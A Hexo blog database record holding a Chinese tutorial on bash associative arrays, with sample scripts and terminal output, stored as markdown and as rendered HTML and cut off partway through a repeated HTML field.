索引负值\n数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。\n如果索引值index<-max_num-1，则会报“数组下标不正确”的异常。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[-1]}\n5\nyerba-buena:tmp yeshaoting$ echo ${arr[-5]}\n1\nyerba-buena:tmp yeshaoting$ echo ${arr[-6]}\n-bash: arr: 数组下标不正确\n```\n\n### 6. 索引超过数组最大个数\n不输出任何内容，也不会报错。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[6]}\n```\n\n\n\n## 四、参考文档\n1. [shell 数组应用实例](http://salogs.com/news/2015/08/02/shell-array-demo/)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)","source":"_posts/article/shell/shell关联数组基本用法.md","raw":"title: shell关联数组基本用法\ntags:\n  - 实践\n  - shell\ncategories:\n  - 系统脚本\ndate: 2016-02-01 12:35:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n**注**：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。\n\n\n## 一、基本用法\n\n### 1. 数组声明\n``` bash\ndeclare -a arr\n```\n\n\n### 2. 数组赋值\n\n#### 静态赋值\n``` bash\narr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)\n```\n\n#### 动态赋值\n``` bash\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n```\n\n\n### 3. 数组遍历\n\n#### 数组索引(键)\n格式：`${!arr[@]}` 或 `${!arr[*]}`\n\n#### 数组内容(值)\n格式：`${arr[@]}` 或 `${arr[*]}`\n\n\n### 4. 数组长度\n格式：\n``` bash\n${#变量}\n```\n该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。\n\n数组长度：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n数组元素长度：\n``` bash\n${#arr[2]}\n```\n\n\n### 5. 子数组\n格式：\n``` bash\n${#arr:index:end}\n```\n\n\n<!-- more -->\n\n\n## 二、举例\n\n### 1. 实例脚本\n``` bash\n#/bin/bash\n\ndeclare -A arr\n\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n\n\n# 数组长度\necho -e '数组长度${#arr[@]}:\\t'${#arr[@]};\necho -e '数组长度${#arr[@]:1:4}:\\t'${#arr[@]:1:4};\necho -e '单个元素长度${#arr[C]}:\\t'${#arr[C]};\necho -e '单个元素长度${#arr[B]}:\\t'${#arr[B]};\necho -e '';\n\n# 数组\necho -e '数组索引${!arr[@]}:\\t'${!arr[@]};\necho -e '全部数组内容${arr[@]}:\\t'${arr[@]};\necho -e '';\n\n# 数组子串\necho -e '数组子串${arr[@]:2}:\\t'${arr[@]:2};\necho -e '数组子串${arr[@]:1:4}:\\t'${arr[@]:1:4};\necho -e '';\n\n# 数组值\necho -e '数组值${arr[b]}:\\t'${arr[b]};\necho -e '数组值${arr[C]}:\\t'${arr[C]};\necho -e '数组值(大小写敏感)${arr[c]}:\\t'${arr[c]};\n```\n\n\n### 2. 实例输出\n``` bash\n数组长度${#arr[@]}:\t5\n数组长度${#arr[@]:1:4}:\t5\n单个元素长度${#arr[C]}:\t2\n单个元素长度${#arr[B]}:\t4\n\n数组索引${!arr[@]}:\tA B C E b\n全部数组内容${arr[@]}:\tA1 B411 C2 E3 b5\n\n数组子串${arr[@]:2}:\tB411 C2 E3 b5\n数组子串${arr[@]:1:4}:\tA1 B411 C2 E3\n\n数组值${arr[b]}:\tb5\n数组值${arr[C]}:\tC2\n数组值(大小写敏感)${arr[c]}:\n```\n\n\n## 三、附加知识\n\n### 1. 内部域分隔符IFS\nshell里默认使用空格、制表符以及换行为分隔符。\n\n### 2. 数组转换\n字符串可通过()默认通过IFS将字符串直接转换成数组。\n``` bash\nyerba-buena:tmp yeshaoting$ str=\"1 3 2 7 5\"\nyerba-buena:tmp yeshaoting$ arr=($str)\nyerba-buena:tmp yeshaoting$ echo ${arr[@]}\n1 3 2 7 5\nyerba-buena:tmp yeshaoting$ echo ${!arr[@]}\n0 1 2 3 4\n```\n\n### 3. 数组键大小写敏感\n`${arr[C]}`取值为C2，`${arr[c]}`则为空。\n另外，键加不加引号都一样，引号可用于拼接键值操作。\n\n### 4. 关联数组键有序\n关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。\n\n### 5. 索引负值\n数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。\n如果索引值index<-max_num-1，则会报“数组下标不正确”的异常。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[-1]}\n5\nyerba-buena:tmp yeshaoting$ echo ${arr[-5]}\n1\nyerba-buena:tmp yeshaoting$ echo ${arr[-6]}\n-bash: arr: 数组下标不正确\n```\n\n### 6. 索引超过数组最大个数\n不输出任何内容，也不会报错。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[6]}\n```\n\n\n\n## 四、参考文档\n1. [shell 数组应用实例](http://salogs.com/news/2015/08/02/shell-array-demo/)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)","slug":"article/shell/shell关联数组基本用法","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxtm00585nbtrqhmvs7b","content":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\"></p>\n<p><strong>注</strong>：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。</p>\n<h2 id=\"一、基本用法\"><a href=\"#一、基本用法\" class=\"headerlink\" title=\"一、基本用法\"></a>一、基本用法</h2><h3 id=\"1-数组声明\"><a href=\"#1-数组声明\" class=\"headerlink\" title=\"1. 数组声明\"></a>1. 数组声明</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">declare</span> <span class=\"_\">-a</span> arr</div></pre></td></tr></table></figure>\n<h3 id=\"2-数组赋值\"><a href=\"#2-数组赋值\" class=\"headerlink\" title=\"2. 数组赋值\"></a>2. 数组赋值</h3><h4 id=\"静态赋值\"><a href=\"#静态赋值\" class=\"headerlink\" title=\"静态赋值\"></a>静态赋值</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">arr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)</div></pre></td></tr></table></figure>\n<h4 id=\"动态赋值\"><a href=\"#动态赋值\" class=\"headerlink\" title=\"动态赋值\"></a>动态赋值</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">arr[<span class=\"string\">\"A\"</span>]=A1</div><div class=\"line\">arr[<span class=\"string\">\"C\"</span>]=C2</div><div class=\"line\">arr[<span class=\"string\">\"E\"</span>]=E3</div><div class=\"line\">arr[<span class=\"string\">\"B\"</span>]=B411</div><div class=\"line\">arr[<span class=\"string\">\"b\"</span>]=b5</div></pre></td></tr></table></figure>\n<h3 id=\"3-数组遍历\"><a href=\"#3-数组遍历\" class=\"headerlink\" title=\"3. 数组遍历\"></a>3. 数组遍历</h3><h4 id=\"数组索引-键\"><a href=\"#数组索引-键\" class=\"headerlink\" title=\"数组索引(键)\"></a>数组索引(键)</h4><p>格式：<code>${!arr[@]}</code> 或 <code>${!arr[*]}</code></p>\n<h4 id=\"数组内容-值\"><a href=\"#数组内容-值\" class=\"headerlink\" title=\"数组内容(值)\"></a>数组内容(值)</h4><p>格式：<code>${arr[@]}</code> 或 <code>${arr[*]}</code></p>\n<h3 id=\"4-数组长度\"><a href=\"#4-数组长度\" class=\"headerlink\" title=\"4. 数组长度\"></a>4. 数组长度</h3><p>格式：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#变量&#125;</span></div></pre></td></tr></table></figure></p>\n<p>该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。</p>\n<p>数组长度：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr[@]&#125;</span></div><div class=\"line\"><span class=\"variable\">$&#123;#arr[*]&#125;</span></div></pre></td></tr></table></figure></p>\n<p>数组元素长度：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr[2]&#125;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-子数组\"><a href=\"#5-子数组\" class=\"headerlink\" title=\"5. 子数组\"></a>5. 子数组</h3><p>格式：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr:index:end&#125;</span></div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h2 id=\"二、举例\"><a href=\"#二、举例\" class=\"headerlink\" title=\"二、举例\"></a>二、举例</h2><h3 id=\"1-实例脚本\"><a href=\"#1-实例脚本\" class=\"headerlink\" title=\"1. 实例脚本\"></a>1. 实例脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#/bin/bash</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">declare</span> -A arr</div><div class=\"line\"></div><div class=\"line\">arr[<span class=\"string\">\"A\"</span>]=A1</div><div class=\"line\">arr[<span class=\"string\">\"C\"</span>]=C2</div><div class=\"line\">arr[<span class=\"string\">\"E\"</span>]=E3</div><div class=\"line\">arr[<span class=\"string\">\"B\"</span>]=B411</div><div class=\"line\">arr[<span class=\"string\">\"b\"</span>]=b5</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组长度</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组长度$&#123;#arr[@]&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[@]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组长度$&#123;#arr[@]:1:4&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[@]:1:4&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'单个元素长度$&#123;#arr[C]&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[C]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'单个元素长度$&#123;#arr[B]&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[B]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组索引$&#123;!arr[@]&#125;:\\t'</span><span class=\"variable\">$&#123;!arr[@]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'全部数组内容$&#123;arr[@]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[@]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组子串</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组子串$&#123;arr[@]:2&#125;:\\t'</span><span class=\"variable\">$&#123;arr[@]:2&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组子串$&#123;arr[@]:1:4&#125;:\\t'</span><span class=\"variable\">$&#123;arr[@]:1:4&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组值</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组值$&#123;arr[b]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[b]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组值$&#123;arr[C]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[C]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组值(大小写敏感)$&#123;arr[c]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[c]&#125;</span>;</div></pre></td></tr></table></figure>\n<h3 id=\"2-实例输出\"><a href=\"#2-实例输出\" class=\"headerlink\" title=\"2. 实例输出\"></a>2. 实例输出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">数组长度<span class=\"variable\">$&#123;#arr[@]&#125;</span>:\t5</div><div class=\"line\">数组长度<span class=\"variable\">$&#123;#arr[@]:1:4&#125;</span>:\t5</div><div class=\"line\">单个元素长度<span class=\"variable\">$&#123;#arr[C]&#125;</span>:\t2</div><div class=\"line\">单个元素长度<span class=\"variable\">$&#123;#arr[B]&#125;</span>:\t4</div><div class=\"line\"></div><div class=\"line\">数组索引<span class=\"variable\">$&#123;!arr[@]&#125;</span>:\tA B C E b</div><div class=\"line\">全部数组内容<span class=\"variable\">$&#123;arr[@]&#125;</span>:\tA1 B411 C2 E3 b5</div><div class=\"line\"></div><div class=\"line\">数组子串<span class=\"variable\">$&#123;arr[@]:2&#125;</span>:\tB411 C2 E3 b5</div><div class=\"line\">数组子串<span class=\"variable\">$&#123;arr[@]:1:4&#125;</span>:\tA1 B411 C2 E3</div><div class=\"line\"></div><div class=\"line\">数组值<span class=\"variable\">$&#123;arr[b]&#125;</span>:\tb5</div><div class=\"line\">数组值<span class=\"variable\">$&#123;arr[C]&#125;</span>:\tC2</div><div class=\"line\">数组值(大小写敏感)<span class=\"variable\">$&#123;arr[c]&#125;</span>:</div></pre></td></tr></table></figure>\n<h2 id=\"三、附加知识\"><a href=\"#三、附加知识\" class=\"headerlink\" title=\"三、附加知识\"></a>三、附加知识</h2><h3 id=\"1-内部域分隔符IFS\"><a href=\"#1-内部域分隔符IFS\" class=\"headerlink\" title=\"1. 内部域分隔符IFS\"></a>1. 内部域分隔符IFS</h3><p>shell里默认使用空格、制表符以及换行为分隔符。</p>\n<h3 id=\"2-数组转换\"><a href=\"#2-数组转换\" class=\"headerlink\" title=\"2. 数组转换\"></a>2. 数组转换</h3><p>字符串可通过()默认通过IFS将字符串直接转换成数组。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ str=<span class=\"string\">\"1 3 2 7 5\"</span></div><div class=\"line\">yerba-buena:tmp yeshaoting$ arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[@]&#125;</span></div><div class=\"line\">1 3 2 7 5</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;!arr[@]&#125;</span></div><div class=\"line\">0 1 2 3 4</div></pre></td></tr></table></figure></p>\n<h3 id=\"3-数组键大小写敏感\"><a href=\"#3-数组键大小写敏感\" class=\"headerlink\" title=\"3. 数组键大小写敏感\"></a>3. 数组键大小写敏感</h3><p><code>${arr[C]}</code>取值为C2，<code>${arr[c]}</code>则为空。<br>另外，键加不加引号都一样，引号可用于拼接键值操作。</p>\n<h3 id=\"4-关联数组键有序\"><a href=\"#4-关联数组键有序\" class=\"headerlink\" title=\"4. 关联数组键有序\"></a>4. 关联数组键有序</h3><p>关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。</p>\n<h3 id=\"5-索引负值\"><a href=\"#5-索引负值\" class=\"headerlink\" title=\"5. 索引负值\"></a>5. 索引负值</h3><p>数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。<br>如果索引值index&lt;-max_num-1，则会报“数组下标不正确”的异常。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[-1]&#125;</span></div><div class=\"line\">5</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[-5]&#125;</span></div><div class=\"line\">1</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[-6]&#125;</span></div><div class=\"line\">-bash: arr: 数组下标不正确</div></pre></td></tr></table></figure></p>\n<h3 id=\"6-索引超过数组最大个数\"><a href=\"#6-索引超过数组最大个数\" class=\"headerlink\" title=\"6. 索引超过数组最大个数\"></a>6. 索引超过数组最大个数</h3><p>不输出任何内容，也不会报错。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[6]&#125;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ol>\n<li><a href=\"http://salogs.com/news/2015/08/02/shell-array-demo/\" target=\"_blank\" rel=\"external\">shell 数组应用实例</a></li>\n<li><a href=\"http://www.1987.name/164.html\" target=\"_blank\" rel=\"external\">[Shell学习笔记] 数组、关联数组和别名使用</a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" /></p>\n<p><strong>注</strong>：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。</p>\n<h2 id=\"一、基本用法\"><a href=\"#一、基本用法\" class=\"headerlink\" title=\"一、基本用法\"></a>一、基本用法</h2><h3 id=\"1-数组声明\"><a href=\"#1-数组声明\" class=\"headerlink\" title=\"1. 数组声明\"></a>1. 数组声明</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">declare</span> <span class=\"_\">-a</span> arr</div></pre></td></tr></table></figure>\n<h3 id=\"2-数组赋值\"><a href=\"#2-数组赋值\" class=\"headerlink\" title=\"2. 数组赋值\"></a>2. 数组赋值</h3><h4 id=\"静态赋值\"><a href=\"#静态赋值\" class=\"headerlink\" title=\"静态赋值\"></a>静态赋值</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">arr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)</div></pre></td></tr></table></figure>\n<h4 id=\"动态赋值\"><a href=\"#动态赋值\" class=\"headerlink\" title=\"动态赋值\"></a>动态赋值</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">arr[<span class=\"string\">\"A\"</span>]=A1</div><div class=\"line\">arr[<span class=\"string\">\"C\"</span>]=C2</div><div class=\"line\">arr[<span class=\"string\">\"E\"</span>]=E3</div><div class=\"line\">arr[<span class=\"string\">\"B\"</span>]=B411</div><div class=\"line\">arr[<span class=\"string\">\"b\"</span>]=b5</div></pre></td></tr></table></figure>\n<h3 id=\"3-数组遍历\"><a href=\"#3-数组遍历\" class=\"headerlink\" title=\"3. 数组遍历\"></a>3. 数组遍历</h3><h4 id=\"数组索引-键\"><a href=\"#数组索引-键\" class=\"headerlink\" title=\"数组索引(键)\"></a>数组索引(键)</h4><p>格式：<code>${!arr[@]}</code> 或 <code>${!arr[*]}</code></p>\n<h4 id=\"数组内容-值\"><a href=\"#数组内容-值\" class=\"headerlink\" title=\"数组内容(值)\"></a>数组内容(值)</h4><p>格式：<code>${arr[@]}</code> 或 <code>${arr[*]}</code></p>\n<h3 id=\"4-数组长度\"><a href=\"#4-数组长度\" class=\"headerlink\" title=\"4. 数组长度\"></a>4. 数组长度</h3><p>格式：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#变量&#125;</span></div></pre></td></tr></table></figure></p>\n<p>该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。</p>\n<p>数组长度：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr[@]&#125;</span></div><div class=\"line\"><span class=\"variable\">$&#123;#arr[*]&#125;</span></div></pre></td></tr></table></figure></p>\n<p>数组元素长度：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr[2]&#125;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-子数组\"><a href=\"#5-子数组\" class=\"headerlink\" title=\"5. 子数组\"></a>5. 子数组</h3><p>格式：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr:index:end&#125;</span></div></pre></td></tr></table></figure></p>","more":"<h2 id=\"二、举例\"><a href=\"#二、举例\" class=\"headerlink\" title=\"二、举例\"></a>二、举例</h2><h3 id=\"1-实例脚本\"><a href=\"#1-实例脚本\" class=\"headerlink\" title=\"1. 实例脚本\"></a>1. 实例脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#/bin/bash</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">declare</span> -A arr</div><div class=\"line\"></div><div class=\"line\">arr[<span class=\"string\">\"A\"</span>]=A1</div><div class=\"line\">arr[<span class=\"string\">\"C\"</span>]=C2</div><div class=\"line\">arr[<span class=\"string\">\"E\"</span>]=E3</div><div class=\"line\">arr[<span class=\"string\">\"B\"</span>]=B411</div><div class=\"line\">arr[<span class=\"string\">\"b\"</span>]=b5</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组长度</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组长度$&#123;#arr[@]&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[@]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组长度$&#123;#arr[@]:1:4&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[@]:1:4&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'单个元素长度$&#123;#arr[C]&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[C]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'单个元素长度$&#123;#arr[B]&#125;:\\t'</span><span class=\"variable\">$&#123;#arr[B]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组索引$&#123;!arr[@]&#125;:\\t'</span><span class=\"variable\">$&#123;!arr[@]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'全部数组内容$&#123;arr[@]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[@]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组子串</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组子串$&#123;arr[@]:2&#125;:\\t'</span><span class=\"variable\">$&#123;arr[@]:2&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组子串$&#123;arr[@]:1:4&#125;:\\t'</span><span class=\"variable\">$&#123;arr[@]:1:4&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 数组值</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组值$&#123;arr[b]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[b]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组值$&#123;arr[C]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[C]&#125;</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">'数组值(大小写敏感)$&#123;arr[c]&#125;:\\t'</span><span class=\"variable\">$&#123;arr[c]&#125;</span>;</div></pre></td></tr></table></figure>\n<h3 id=\"2-实例输出\"><a href=\"#2-实例输出\" class=\"headerlink\" title=\"2. 实例输出\"></a>2. 实例输出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">数组长度<span class=\"variable\">$&#123;#arr[@]&#125;</span>:\t5</div><div 